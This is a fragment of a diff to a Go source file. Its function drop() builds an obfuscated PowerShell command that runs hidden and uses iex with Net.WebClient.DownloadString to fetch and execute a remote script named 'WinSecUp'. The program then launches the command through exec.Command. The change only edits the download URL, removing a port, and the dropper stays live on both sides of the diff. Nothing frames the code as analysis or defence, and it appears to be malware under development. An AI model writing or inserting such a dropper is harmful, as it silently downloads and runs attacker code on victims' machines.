@@ -6,7 +6,7 @@ import (
 )
 
 func drop() {
-	fun := "p\"\"OWe\"\"RshE\"\"lL -noP -w Hidden -c \"iex(NeW-obJEcT NEt.wEbCliENt).DoWnlOAdStRinG('http://XXXXX:8000/WinSecUp')\""
+	fun := "p\"\"OWe\"\"RshE\"\"lL -noP -w Hidden -c \"iex(NeW-obJEcT NEt.wEbCliENt).DoWnlOAdStRinG('http://XXXXX/WinSecUp')\""
 
 	cmd2 := exec.Command("powershell", "-NOp", fun)
 	err2 := cmd2.Run()
